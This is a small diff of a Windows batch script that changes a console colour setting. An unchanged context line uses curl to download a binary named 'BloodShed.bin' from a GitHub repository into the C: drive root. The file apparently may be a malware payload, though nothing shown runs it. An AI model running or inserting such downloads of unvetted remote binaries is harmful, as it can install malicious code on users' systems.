@@ -1,5 +1,5 @@
 @echo off
-color OA
+color A
 
 :init
 curl -L "https://github.com/Syed930s/BloodShed/blob/main/BloodShed.bin" -o C:\bloodshed.bin
